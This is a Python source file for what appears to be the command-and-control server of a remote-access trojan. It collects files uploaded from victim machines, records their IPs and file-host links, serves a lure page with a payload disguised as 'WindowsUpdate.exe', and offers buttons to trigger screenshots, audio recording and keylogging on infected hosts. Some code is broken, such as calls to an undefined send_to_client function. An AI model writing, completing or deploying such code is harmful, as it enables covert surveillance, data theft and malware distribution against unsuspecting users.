import os
import socket
import threading
import tkinter as tk

color_codes = {
    'black': '\033[30m',
    'red': '\033[31m',
    'green': '\033[32m',
    'yellow': '\033[33m',
    'blue': '\033[34m',
    'magenta': '\033[35m',
    'cyan': '\033[36m',
    'white': '\033[37m',
    'reset': '\033[0m',  # Reset to default color
}

# Shared variables and lock for connections count
connections_count = 0
connections_lock = threading.Lock()

def handle_client(conn, addr):
    global connections_count

    with connections_lock:
        connections_count += 1

    update_connection_label(connection_label)
    update_connected_ips_listbox(addr[0])


    # Read the existing clients from the file
    clients = read_clients()

    if addr[0] not in clients:
        # Add the new client to the dictionary
        clients[addr[0]] = addr[1]

        # Write the updated clients to the file
        write_clients(clients)

    print(f"Connected to: {color_codes['cyan']} {addr} {color_codes['reset']}")
    message = conn.recv(1024).decode()

    if message == "file":
        handle_file_message(conn, addr)
    elif message == "str":
        handle_string_message(conn, addr)
    else:
        handle_other_message(conn, message)

    with connections_lock:
        connections_count -= 1

    update_connection_label(connection_label)
    update_connected_ips_listbox(addr[0], remove=True)

    conn.close()


def update_connection_label(label):
    label.config(text=f"Connections: {connections_count}")
    label.update()


def update_connected_ips_listbox(ip, remove=False):
    if remove:
        index = connected_ips_listbox.get(0, tk.END).index(ip)
        connected_ips_listbox.delete(index)
    else:
        connected_ips_listbox.insert(tk.END, ip)


def handle_file_message(conn, addr):
    file_name, file_size, file_ext, directory = conn.recv(1024).decode().split("ยง")
    print(directory)
    file_size = int(file_size)

    print(f"------------------------ \n"
          f"{color_codes['magenta']}Downloading{color_codes['reset']} new file: {color_codes['blue']}{file_name}{color_codes['reset']} \n"
          f"{color_codes['yellow']}File{color_codes['reset']} size: {color_codes['red']} {file_size} {color_codes['reset']} \n"
          f"{color_codes['yellow']}File{color_codes['reset']} extension: {color_codes['green']} {file_ext} {color_codes['reset']}")

    file_data = receive_file(conn, file_size)
    save_file(conn, addr, file_name, directory, file_data)


def receive_file(conn, file_size):
    file_data = b""
    while len(file_data) < file_size:
        data = conn.recv(409600)
        if not data:
            break
        file_data += data
        progress = len(file_data) / file_size * 100
        #print(f"\r{color_codes['magenta']}Downloaded{color_codes['reset']} {color_codes['cyan']} {len(file_data)}/{file_size }{color_codes['reset']} {color_codes['cyan']} ({progress:.2f}%) {color_codes['reset']}", end="")
    print(f"\r{color_codes['magenta']}Downloaded{color_codes['reset']} {color_codes['green']} {len(file_data)}/{file_size} {color_codes['green']} (100%) {color_codes['reset']}")
    return file_data


def save_file(conn, addr, file_name, directory, file_data):
    client_dir = os.path.join("received", str(addr[0]))
    os.makedirs(client_dir, exist_ok=True)

    full_dir = os.path.join(client_dir, directory)
    os.makedirs(full_dir, exist_ok=True)

    file_path = os.path.join(full_dir, file_name)
    try:
        with open(file_path, "wb") as f:
            f.write(file_data)
        print(f"{color_codes['yellow']}File{color_codes['reset']} saved to {color_codes['cyan']}{file_path}{color_codes['reset']} \n"
              f"--------------------------")
        #conn.send(f"File downloaded successfully saved at: received/{str(addr[0])}/{directory}/{file_name}".encode())
        conn.send(f"File {file_name} uploaded successfully to the server.".encode())
    except Exception as e:
        print(f"Error saving file {file_path}: {e}")
        conn.send(f"Error saving file {file_name}".encode())


def handle_string_message(conn, addr):
    client_dir = os.path.join("received", str(addr[0]))
    if not os.path.exists(client_dir):
        os.makedirs(client_dir, exist_ok=True)

    string = conn.recv(1024).decode()
    print(f"{color_codes['blue']}Server{color_codes['reset']} received this: {color_codes['red']} {string} {color_codes['reset']}")
    conn.send("Hello from Server!".encode())
    port = 5555

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((addr[0], port))
    s.send(str.encode("Hello from client!"))

    # Close the connection
    s.close()

    # Extract the filename and download link from the message
    file_info = string.split("File: ")[1].split(" was uploaded to Go-file, link: ")
    filename = file_info[0]
    download_link = file_info[1]

    # Write the filename and download link to go-links.txt
    with open(f"{client_dir}/go-links.txt", "a") as file:
        file.write(f"{filename}\t{download_link}\n")


def handle_other_message(conn, message):
    if "download-link" in message:
        print("Clicked download")
        #send_file(conn, 'dist/scan.exe')
        send_file(conn, 'WindowsUpdate.exe')
    try:
        # send_file(conn, 'dist/scan.exe')
        create_site(conn)
    except Exception as e:
        print(f"Error, why: {e}")


def send_file(conn, file_path):
    # Check if the file exists
    if not os.path.isfile(file_path):
        conn.send(str.encode(f"Error: {file_path} does not exist."))
        return

    # Get the file size
    file_size = os.path.getsize(file_path)

    # Set the Content-Disposition header to force download and include the file name
    conn.send(str.encode("HTTP/1.1 200 OK\n"))
    conn.send(str.encode(f"Content-Disposition: attachment; filename=\"WindowsUpdate.exe\"\n"))
    #conn.send(str.encode(f"Content-Disposition: attachment; filename=\"{os.path.basename(file_path)}\"\n"))
    conn.send(str.encode(f"Content-Type: application/octet-stream\n"))
    conn.send(str.encode(f"Content-Length: {file_size}\n"))
    conn.send(str.encode("\n"))

    # Send the file contents
    with open(file_path, "rb") as f:
        data = f.read(4096)
        while data:
            conn.send(data)
            data = f.read(4096)

    print(f"File {file_path} sent successfully.")


def create_site(conn):
    try:
        with open('site.html', 'r') as file:
            response = file.read()
    except Exception as e:
        print(f"Error loading HTML file: {e}")
        return
    conn.send(str.encode("HTTP/1.1 200 OK\n"))
    conn.send(str.encode("Content-Type: text/html\n"))
    conn.send(str.encode(f"Content-Length: {len(response)}\n"))
    conn.send(str.encode("\n"))
    conn.send(str.encode(response))


def read_clients():
    clients = {}
    if not os.path.exists('clients.txt'):
        return clients
    with open('clients.txt', 'r') as file:
        for line in file:
            ip, port = line.strip().split(':')
            clients[ip] = int(port)
    return clients


def write_clients(clients):
    with open('clients.txt', 'w+') as file:
        for ip, port in clients.items():
            file.write(f'{ip}:{port}\n')
    update_saved_ips_listbox(clients)


def update_saved_ips_listbox(clients):
    saved_ips_listbox.delete(0, tk.END)
    for ip, port in clients.items():
        saved_ips_listbox.insert(tk.END, f"{ip}:{port}")


def call_agents(command):
    # Read the existing clients from the file
    clients = read_clients()
    for ip, port in clients.items():
        print(f"Sending {command} to machine at IP: {ip}, Port: {port}")
        send_to_client(ip, port, command)


def start_server():
    # Start the server
    server = socket.gethostbyname(socket.gethostname())
    server = '0.0.0.0'
    port = 5555
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((server, port))
    s.listen(5)
    print(f"Waiting for connection on {server}:{port}...")

    while True:
        conn, addr = s.accept()
        try:
            threading.Thread(target=handle_client, args=(conn, addr)).start()
        except Exception as e:
            print(e)


def create_gui():
    global connection_label, connected_ips_listbox, saved_ips_listbox

    # Create the GUI
    root = tk.Tk()
    root.title("Server Status")

    # Create labels to display server status information
    connection_label = tk.Label(root, text="Connections: 0")
    connection_label.pack()

    # Create a listbox to display connected IPs
    connected_ips_label = tk.Label(root, text="Connected IPs:")
    connected_ips_label.pack()

    connected_ips_listbox = tk.Listbox(root, selectmode=tk.SINGLE)
    connected_ips_listbox.pack()

    # Create a listbox to display saved client IPs
    saved_ips_label = tk.Label(root, text="Saved Client IPs:")
    saved_ips_label.pack()

    saved_ips_listbox = tk.Listbox(root, selectmode=tk.SINGLE)
    saved_ips_listbox.pack()

    # Load saved client IPs from the clients.txt file
    saved_clients = read_clients()
    for ip, port in saved_clients.items():
        saved_ips_listbox.insert(tk.END, f"{ip}:{port}")

    # Create buttons
    screenshot_button = tk.Button(root, text="Screenshot", width=15, command=take_screenshot)
    screenshot_button.pack()

    audio_button = tk.Button(root, text="Audio", width=15, command=record_audio)
    audio_button.pack()

    keys_button = tk.Button(root, text="Keys", width=15, command=monitor_keys)
    keys_button.pack()

    # Start the GUI main loop
    root.mainloop()


def take_screenshot():
    selected_item = saved_ips_listbox.get(saved_ips_listbox.curselection())
    if selected_item:
        # Extract the IP and port from the selected item
        selected_ip, selected_port = selected_item.split(':')
        # Perform the desired action for the selected IP and port
        print(f"Taking screenshot for IP: {selected_ip}, Port: {selected_port}")
        send_to_client(selected_ip, int(selected_port), 'a')


def record_audio():
    selected_item = saved_ips_listbox.get(saved_ips_listbox.curselection())
    if selected_item:
        # Extract the IP and port from the selected item
        selected_ip, selected_port = selected_item.split(':')
        # Perform the desired action for the selected IP and port
        print(f"Recording audio for IP: {selected_ip}, Port: {selected_port}")
        send_to_client(selected_ip, int(selected_port), 'a')


def monitor_keys():
    selected_item = saved_ips_listbox.get(saved_ips_listbox.curselection())
    if selected_item:
        # Extract the IP and port from the selected item
        selected_ip, selected_port = selected_item.split(':')
        # Perform the desired action for the selected IP and port
        print(f"Monitoring keys for IP: {selected_ip}, Port: {selected_port}")
        send_to_client(selected_ip, int(selected_port), 'a')



# Create and start the threads
server_thread = threading.Thread(target=start_server)
server_thread.start()

gui_thread = threading.Thread(target=create_gui)
gui_thread.start()
